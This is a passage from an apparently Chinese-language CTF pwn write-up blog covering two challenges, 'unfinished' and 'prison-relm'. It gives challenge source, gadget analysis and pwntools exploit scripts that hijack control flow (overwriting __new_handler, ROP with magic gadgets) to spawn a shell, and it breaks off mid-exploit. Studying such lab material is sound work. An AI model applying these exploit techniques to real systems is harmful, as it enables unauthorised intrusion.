class="code-snippet__pre code-snippet__pre--dark"><code class="language-c language-c"><span style="color:#666666">#</span><span style="color:#4D9375">include</span><span style="color:#C98A7D77"> &#x3C;</span><span style="color:#C98A7D">cstdio</span><span style="color:#C98A7D77">></span><br><span style="color:#666666">#</span><span style="color:#4D9375">include</span><span style="color:#C98A7D77"> &#x3C;</span><span style="color:#C98A7D">cstdlib</span><span style="color:#C98A7D77">></span><br><br><span style="color:#CB7676">char</span><span style="color:#BD976A"> number</span><span style="color:#5eaab5">[</span><span style="color:#4C9A91">128</span><span style="color:#5eaab5">]</span><span style="color:#666666">;</span><br><br><span style="color:#CB7676">void</span><span style="color:#80A665"> sigma_mode</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><span style="color:#666666"> </span><span style="color:#5eaab5">{</span><br><span style="color:#80A665">    system</span><span style="color:#4d9375">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">/bin/sh</span><span style="color:#C98A7D77">"</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#5eaab5">}</span><br><br><span style="color:#CB7676">int</span><span style="color:#80A665"> main</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><span style="color:#666666"> </span><span style="color:#5eaab5">{</span><br><span style="color:#80A665">    setvbuf</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">stdout</span><span style="color:#666666">,</span><span style="color:#4D9375"> NULL</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> _IONBF</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#80A665">    setvbuf</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">stdin</span><span style="color:#666666">,</span><span style="color:#4D9375"> NULL</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> _IONBF</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><br><span style="color:#80A665">    printf</span><span style="color:#4d9375">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">What size allocation?</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#80A665">    fgets</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">number</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 500</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> stdin</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><br><span style="color:#CB7676">    long</span><span style="color:#DBD7CAEE"> n </span><span style="color:#666666">=</span><span style="color:#80A665"> atol</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">number</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#CB7676">    int</span><span style="color:#CB7676"> *</span><span style="color:#DBD7CAEE">chunk </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> new </span><span style="color:#CB7676">int</span><span style="color:#4d9375">[</span><span style="color:#DBD7CAEE">n</span><span style="color:#4d9375">]</span><span style="color:#666666">;</span><br><span style="color:#758575DD">    // TODO: finish the heap chal</span><br><span style="color:#5eaab5">}</span><br></code></pre></div>
<p>可以看到给了个可控任意地址的 <code class="inline-code">new</code> 和 <code class="inline-code">backdoor</code>，还有 bss 上的溢出，读一下源码。</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-cc language-cc">_GLIBCXX_WEAK_DEFINITION void *
operator new (std::size_t sz) _GLIBCXX_THROW (std::bad_alloc)
{
  void *p;

  /* malloc (0) is unpredictable; avoid it.  */
  if (__builtin_expect (sz == 0, false))
    sz = 1;

  while ((p = malloc (sz)) == 0)
    {
      new_handler handler = std::get_new_handler ();
      if (! handler)
	_GLIBCXX_THROW_OR_ABORT(bad_alloc());
      handler ();
    }

  return p;
}
</code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-cc language-cc">_GLIBCXX_WEAK_DEFINITION void *
operator new (std::size_t sz) _GLIBCXX_THROW (std::bad_alloc)
{
  void *p;

  /* malloc (0) is unpredictable; avoid it.  */
  if (__builtin_expect (sz == 0, false))
    sz = 1;

  while ((p = malloc (sz)) == 0)
    {
      new_handler handler = std::get_new_handler ();
      if (! handler)
	_GLIBCXX_THROW_OR_ABORT(bad_alloc());
      handler ();
    }

  return p;
}
</code></pre></div>
<p>这里布置了一个函数指针 <code class="inline-code">handler</code>，看一下 <code class="inline-code">get_new_handler()</code>：</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-cc language-cc">new_handler
std::get_new_handler () noexcept
{
  new_handler handler;
#if ATOMIC_POINTER_LOCK_FREE > 1
  __atomic_load (&__new_handler, &handler, __ATOMIC_ACQUIRE);
#else
  __gnu_cxx::__scoped_lock l(mx);
  handler = __new_handler;
#endif
  return handler;
}
</code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-cc language-cc">new_handler
std::get_new_handler () noexcept
{
  new_handler handler;
#if ATOMIC_POINTER_LOCK_FREE > 1
  __atomic_load (&__new_handler, &handler, __ATOMIC_ACQUIRE);
#else
  __gnu_cxx::__scoped_lock l(mx);
  handler = __new_handler;
#endif
  return handler;
}
</code></pre></div>
<p>注意看，这里有一个 <code class="inline-code">handler = __new_handler;</code> 的赋值，右值是一个全局变量....</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-cc language-cc">using std::new_handler;
namespace
{
  new_handler __new_handler;
}
</code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-cc language-cc">using std::new_handler;
namespace
{
  new_handler __new_handler;
}
</code></pre></div>
<p><img loading="lazy" decoding="async" fetchpriority="auto" src="https://pic1.imgdb.cn/item/681c116a58cb8da5c8e41aae.png" alt="__new_handler"/></p>
<p>最后一个问题，<code class="inline-code">malloc</code> 什么时候返回值为 <code class="inline-code">0</code> 呢？答案是当分配一个过大的内存时。</p>
<p>exp：</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-python language-python"><span style="color:#A0ADA0">#!/usr/bin/env python3</span><br><br><span style="color:#1E754F">from</span><span style="color:#393A34"> pwn </span><span style="color:#1E754F">import</span><span style="color:#AB5959"> *</span><br><span style="color:#1E754F">from</span><span style="color:#393A34"> sys </span><span style="color:#1E754F">import</span><span style="color:#393A34"> argv</span><br><br><span style="color:#393A34">proc </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">./unfinished_patched</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">log_level </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">debug</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">binary </span><span style="color:#999999">=</span><span style="color:#393A34"> proc</span><br><span style="color:#393A34">elf </span><span style="color:#999999">=</span><span style="color:#393A34"> ELF</span><span style="color:#2993a3">(</span><span style="color:#393A34">proc</span><span style="color:#999999">,</span><span style="color:#B07D48"> checksec</span><span style="color:#999999">=</span><span style="color:#1E754F">False</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">libc </span><span style="color:#999999">=</span><span style="color:#393A34"> ELF</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">./libc.so.6</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> checksec</span><span style="color:#999999">=</span><span style="color:#1E754F">False</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io </span><span style="color:#999999">=</span><span style="color:#393A34"> remote</span><span style="color:#2993a3">(</span><span style="color:#B5695977">""</span><span style="color:#999999">,</span><span style="color:#999999"> </span><span style="color:#2993a3">)</span><span style="color:#1E754F"> if</span><span style="color:#393A34"> argv</span><span style="color:#2993a3">[</span><span style="color:#2F798A">1</span><span style="color:#2993a3">]</span><span style="color:#AB5959"> ==</span><span style="color:#B5695977"> '</span><span style="color:#B56959">r</span><span style="color:#B5695977">'</span><span style="color:#1E754F"> else</span><span style="color:#393A34"> process</span><span style="color:#2993a3">(</span><span style="color:#393A34">proc</span><span style="color:#2993a3">)</span><br><br><span style="color:#1E754F">if</span><span style="color:#393A34"> args</span><span style="color:#999999">.</span><span style="color:#393A34">G</span><span style="color:#999999">:</span><br><span style="color:#393A34">    gdb</span><span style="color:#999999">.</span><span style="color:#393A34">attach</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">,</span><span style="color:#B5695977"> """</span><br><span style="color:#B56959">    decompiler connect ida --host 127.0.0.1 --port 3662</span><br><span style="color:#B56959">    b* 0x401a47</span><br><span style="color:#B56959">    b* 0x4031d0</span><br><span style="color:#B5695977">    """</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">system </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">4019b6</span><br><span style="color:#393A34">payload </span><span style="color:#999999">=</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">10000000000</span><span style="color:#B5695977">"</span><span style="color:#999999">.</span><span style="color:#393A34">ljust</span><span style="color:#2993a3">(</span><span style="color:#2F798A">128</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">a</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#A0ADA0"># payload += p64(system) * 50</span><br><span style="color:#A0ADA0"># payload += cyclic(0x100, n=8)</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">a</span><span style="color:#B5695977">"</span><span style="color:#AB5959"> *</span><span style="color:#2F798A"> 72</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> p64</span><span style="color:#2993a3">(</span><span style="color:#393A34">system</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">What size allocation?</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#393A34"> payload</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">interactive</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-python language-python"><span style="color:#758575DD">#!/usr/bin/env python3</span><br><br><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> pwn </span><span style="color:#4D9375">import</span><span style="color:#CB7676"> *</span><br><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> sys </span><span style="color:#4D9375">import</span><span style="color:#DBD7CAEE"> argv</span><br><br><span style="color:#DBD7CAEE">proc </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">./unfinished_patched</span><span style="color:#C98A7D77">"</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">log_level </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">debug</span><span style="color:#C98A7D77">"</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">binary </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> proc</span><br><span style="color:#DBD7CAEE">elf </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> ELF</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">proc</span><span style="color:#666666">,</span><span style="color:#BD976A"> checksec</span><span style="color:#666666">=</span><span style="color:#4D9375">False</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">libc </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> ELF</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">./libc.so.6</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#BD976A"> checksec</span><span style="color:#666666">=</span><span style="color:#4D9375">False</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">io </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> remote</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">""</span><span style="color:#666666">,</span><span style="color:#666666"> </span><span style="color:#5eaab5">)</span><span style="color:#4D9375"> if</span><span style="color:#DBD7CAEE"> argv</span><span style="color:#5eaab5">[</span><span style="color:#4C9A91">1</span><span style="color:#5eaab5">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">r</span><span style="color:#C98A7D77">'</span><span style="color:#4D9375"> else</span><span style="color:#DBD7CAEE"> process</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">proc</span><span style="color:#5eaab5">)</span><br><br><span style="color:#4D9375">if</span><span style="color:#DBD7CAEE"> args</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">G</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    gdb</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">attach</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> """</span><br><span style="color:#C98A7D">    decompiler connect ida --host 127.0.0.1 --port 3662</span><br><span style="color:#C98A7D">    b* 0x401a47</span><br><span style="color:#C98A7D">    b* 0x4031d0</span><br><span style="color:#C98A7D77">    """</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">system </span><span style="color:#666666">=</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">4019b6</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">=</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">10000000000</span><span style="color:#C98A7D77">"</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ljust</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">128</span><span style="color:#666666">,</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">a</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#758575DD"># payload += p64(system) * 50</span><br><span style="color:#758575DD"># payload += cyclic(0x100, n=8)</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">a</span><span style="color:#C98A7D77">"</span><span style="color:#CB7676"> *</span><span style="color:#4C9A91"> 72</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> p64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">system</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">What size allocation?</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> payload</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">interactive</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br></code></pre></div>
<h2 id="prison-relm" class="scroll-target"><a href="#prison-relm"><code class="hash inline-code">#</code>prison-relm</a></h2>
<p>神秘 magic gadget 题。</p>
<p>依然给了源码：</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-c language-c"><span style="color:#999999">#</span><span style="color:#1E754F">include</span><span style="color:#B5695977"> &#x3C;</span><span style="color:#B56959">signal.h</span><span style="color:#B5695977">></span><br><span style="color:#999999">#</span><span style="color:#1E754F">include</span><span style="color:#B5695977"> &#x3C;</span><span style="color:#B56959">stdio.h</span><span style="color:#B5695977">></span><br><span style="color:#999999">#</span><span style="color:#1E754F">include</span><span style="color:#B5695977"> &#x3C;</span><span style="color:#B56959">unistd.h</span><span style="color:#B5695977">></span><br><span style="color:#999999">#</span><span style="color:#1E754F">include</span><span style="color:#B5695977"> &#x3C;</span><span style="color:#B56959">stdlib.h</span><span style="color:#B5695977">></span><br><br><span style="color:#A0ADA0">// 閉門</span><br><span style="color:#AB5959">void</span><span style="color:#59873A"> gate_close</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#999999"> </span><span style="color:#2993a3">{</span><br><span style="color:#59873A">  exit</span><span style="color:#1e754f">(</span><span style="color:#2F798A">1</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#2993a3">}</span><br><br><span style="color:#A0ADA0">// Will you get stuck in the prison realm?</span><br><span style="color:#A0ADA0">//</span><br><span style="color:#A0ADA0">//</span><br><span style="color:#A0ADA0">// 獄門疆 開門</span><br><span style="color:#59873A">__attribute__</span><span style="color:#2993a3">(</span><span style="color:#1e754f">(</span><span style="color:#393A34">constructor</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#AB5959">void</span><span style="color:#59873A"> prison_realm_open</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#999999"> </span><span style="color:#2993a3">{</span><br><span style="color:#59873A">  setvbuf</span><span style="color:#1e754f">(</span><span style="color:#393A34">stdout</span><span style="color:#999999">,</span><span style="color:#1E754F"> NULL</span><span style="color:#999999">,</span><span style="color:#393A34"> _IONBF</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">  setvbuf</span><span style="color:#1e754f">(</span><span style="color:#393A34">stdin</span><span style="color:#999999">,</span><span style="color:#1E754F"> NULL</span><span style="color:#999999">,</span><span style="color:#393A34"> _IONBF</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">  signal</span><span style="color:#1e754f">(</span><span style="color:#393A34">SIGALRM</span><span style="color:#999999">,</span><span style="color:#393A34"> gate_close</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">  alarm</span><span style="color:#1e754f">(</span><span style="color:#2F798A">60</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#2993a3">}</span><br><br><span style="color:#AB5959">int</span><span style="color:#59873A"> main</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#999999"> </span><span style="color:#2993a3">{</span><br><br><span style="color:#A0ADA0">  // Geto steps out from behind the activated prison realm...</span><br><span style="color:#AB5959">  char</span><span style="color:#B07D48"> barrier_dimension_realm</span><span style="color:#1e754f">[</span><span style="color:#2F798A">30</span><span style="color:#1e754f">]</span><span style="color:#999999">;</span><br><span style="color:#59873A">  fgets</span><span style="color:#1e754f">(</span><span style="color:#393A34">barrier_dimension_realm</span><span style="color:#999999">,</span><span style="color:#2F798A"> 300</span><span style="color:#999999">,</span><span style="color:#393A34"> stdin</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#2993a3">}</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-c language-c"><span style="color:#666666">#</span><span style="color:#4D9375">include</span><span style="color:#C98A7D77"> &#x3C;</span><span style="color:#C98A7D">signal.h</span><span style="color:#C98A7D77">></span><br><span style="color:#666666">#</span><span style="color:#4D9375">include</span><span style="color:#C98A7D77"> &#x3C;</span><span style="color:#C98A7D">stdio.h</span><span style="color:#C98A7D77">></span><br><span style="color:#666666">#</span><span style="color:#4D9375">include</span><span style="color:#C98A7D77"> &#x3C;</span><span style="color:#C98A7D">unistd.h</span><span style="color:#C98A7D77">></span><br><span style="color:#666666">#</span><span style="color:#4D9375">include</span><span style="color:#C98A7D77"> &#x3C;</span><span style="color:#C98A7D">stdlib.h</span><span style="color:#C98A7D77">></span><br><br><span style="color:#758575DD">// 閉門</span><br><span style="color:#CB7676">void</span><span style="color:#80A665"> gate_close</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><span style="color:#666666"> </span><span style="color:#5eaab5">{</span><br><span style="color:#80A665">  exit</span><span style="color:#4d9375">(</span><span style="color:#4C9A91">1</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#5eaab5">}</span><br><br><span style="color:#758575DD">// Will you get stuck in the prison realm?</span><br><span style="color:#758575DD">//</span><br><span style="color:#758575DD">//</span><br><span style="color:#758575DD">// 獄門疆 開門</span><br><span style="color:#80A665">__attribute__</span><span style="color:#5eaab5">(</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">constructor</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#CB7676">void</span><span style="color:#80A665"> prison_realm_open</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><span style="color:#666666"> </span><span style="color:#5eaab5">{</span><br><span style="color:#80A665">  setvbuf</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">stdout</span><span style="color:#666666">,</span><span style="color:#4D9375"> NULL</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> _IONBF</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#80A665">  setvbuf</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">stdin</span><span style="color:#666666">,</span><span style="color:#4D9375"> NULL</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> _IONBF</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#80A665">  signal</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">SIGALRM</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> gate_close</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#80A665">  alarm</span><span style="color:#4d9375">(</span><span style="color:#4C9A91">60</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#5eaab5">}</span><br><br><span style="color:#CB7676">int</span><span style="color:#80A665"> main</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><span style="color:#666666"> </span><span style="color:#5eaab5">{</span><br><br><span style="color:#758575DD">  // Geto steps out from behind the activated prison realm...</span><br><span style="color:#CB7676">  char</span><span style="color:#BD976A"> barrier_dimension_realm</span><span style="color:#4d9375">[</span><span style="color:#4C9A91">30</span><span style="color:#4d9375">]</span><span style="color:#666666">;</span><br><span style="color:#80A665">  fgets</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">barrier_dimension_realm</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 300</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> stdin</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#5eaab5">}</span><br></code></pre></div>
<p>ida 里可以看到基本上没什么能用的函数，尽管给了几乎无限的栈溢出。</p>
<p>那想法肯定是先看看有没有 magic gadget 能用，搜到下面这条：</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-text">0x0000000000400668 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; repz ret
</code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-text">0x0000000000400668 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; repz ret
</code></pre></div>
<p>记为 gadget1。</p>
<p>但是没什么用，出题人 patch 了 <code class="inline-code">__libc_csu_init</code> 使得题目中没有可以控制 <code class="inline-code">ebx</code> 的 gadget，怎么办呢.jpg</p>
<p>接下来真的很神秘，出题人用了下面这个 gadget：</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-text">0x00000000004005cf : add bl, dh ; ret
</code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-text">0x00000000004005cf : add bl, dh ; ret
</code></pre></div>
<p>记为 gadget2</p>
<p><code class="inline-code">bl</code> 是 <code class="inline-code">rbx</code> 的低 8 位寄存器，<code class="inline-code">dh</code> 是 <code class="inline-code">rdx</code> 的低 8 位寄存器。</p>
<p>调试一下发现 <code class="inline-code">dh</code> 是 0x20，也就是说配合 <code class="inline-code">gadget1</code> 可以做到任意地址 + 0x20.... 有什么用呢.jpg</p>
<p>我们调一下 <code class="inline-code">fgets</code> 的汇编，发现：</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-text">0x70330887f4a0 <_IO_fgets+288>:      mov    BYTE PTR [rdi],0x0
0x70330887f4a3 <_IO_fgets+291>:      mov    r14,rdi
0x70330887f4a6 <_IO_fgets+294>:      jmp    0x70330887f44c <_IO_fgets+204>
0x70330887f4a8 <_IO_fgets+296>:      nop    DWORD PTR [rax+rax*1+0x0]
0x70330887f4b0 <_IO_fgets+304>:      call   0x703308891300 <__GI___lll_lock_wake_private>
...
0x70330887f44c <_IO_fgets+204>:      pop    rbx
0x70330887f44d <_IO_fgets+205>:      mov    rax,r14
0x70330887f450 <_IO_fgets+208>:      pop    rbp
0x70330887f451 <_IO_fgets+209>:      pop    r12
0x70330887f453 <_IO_fgets+211>:      pop    r13
0x70330887f455 <_IO_fgets+213>:      pop    r14
0x70330887f457 <_IO_fgets+215>:      ret
</code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-text">0x70330887f4a0 <_IO_fgets+288>:      mov    BYTE PTR [rdi],0x0
0x70330887f4a3 <_IO_fgets+291>:      mov    r14,rdi
0x70330887f4a6 <_IO_fgets+294>:      jmp    0x70330887f44c <_IO_fgets+204>
0x70330887f4a8 <_IO_fgets+296>:      nop    DWORD PTR [rax+rax*1+0x0]
0x70330887f4b0 <_IO_fgets+304>:      call   0x703308891300 <__GI___lll_lock_wake_private>
...
0x70330887f44c <_IO_fgets+204>:      pop    rbx
0x70330887f44d <_IO_fgets+205>:      mov    rax,r14
0x70330887f450 <_IO_fgets+208>:      pop    rbp
0x70330887f451 <_IO_fgets+209>:      pop    r12
0x70330887f453 <_IO_fgets+211>:      pop    r13
0x70330887f455 <_IO_fgets+213>:      pop    r14
0x70330887f457 <_IO_fgets+215>:      ret
</code></pre></div>
<p>。。。这样我们就能控制 rbx 了... 然后就有任意地址写原语了....</p>
<p>小时候做这题吓哭了。。</p>
<p>exp</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-python language-python"><span style="color:#1E754F">from</span><span style="color:#393A34"> pwn </span><span style="color:#1E754F">import</span><span style="color:#AB5959"> *</span><br><span style="color:#1E754F">from</span><span style="color:#393A34"> sys </span><span style="color:#1E754F">import</span><span style="color:#393A34"> argv</span><br><br><span style="color:#393A34">proc </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">./prison_patched</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">log_level </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">debug</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">binary </span><span style="color:#999999">=</span><span style="color:#393A34"> proc</span><br><span style="color:#393A34">elf </span><span style="color:#999999">=</span><span style="color:#393A34"> ELF</span><span style="color:#2993a3">(</span><span style="color:#393A34">proc</span><span style="color:#999999">,</span><span style="color:#B07D48"> checksec</span><span style="color:#999999">=</span><span style="color:#1E754F">False</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io </span><span style="color:#999999">=</span><span style="color:#393A34"> remote</span><span style="color:#2993a3">(</span><span style="color:#B5695977">""</span><span style="color:#999999">,</span><span style="color:#999999"> </span><span style="color:#2993a3">)</span><span style="color:#1E754F"> if</span><span style="color:#393A34"> argv</span><span style="color:#2993a3">[</span><span style="color:#2F798A">1</span><span style="color:#2993a3">]</span><span style="color:#AB5959"> ==</span><span style="color:#B5695977"> '</span><span style="color:#B56959">r</span><span style="color:#B5695977">'</span><span style="color:#1E754F"> else</span><span style="color:#393A34"> process</span><span style="color:#2993a3">(</span><span style="color:#393A34">proc</span><span style="color:#2993a3">)</span><br><br><span style="color:#1E754F">if</span><span style="color:#393A34"> args</span><span style="color:#999999">.</span><span style="color:#393A34">G</span><span style="color:#999999">:</span><br><span style="color:#393A34">    gdb</span><span style="color:#999999">.</span><span style="color:#393A34">attach</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">,</span><span style="color:#B5695977"> """</span><br><span style="color:#B56959">    b *0x400718</span><br><span style="color:#B56959">    b *0x400782</span><br><span style="color:#B5695977">    """</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#A0ADA0"># 0x0000000000400668 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; repz ret</span><br><span style="color:#A0ADA0"># 0x00000000004005cf : add bl, dh ; ret</span><br><span style="color:#A0ADA0"># 0x0000000000400608 : pop rbp ; ret</span><br><span style="color:#A0ADA0"># 0x0000000000400782 : pop rdi ; xor rbx, rbx ; ret</span><br><span style="color:#A0ADA0"># 0x0000000000400783 : xor rbx, rbx ; ret</span><br><br><br><span style="color:#393A34">magic </span><span 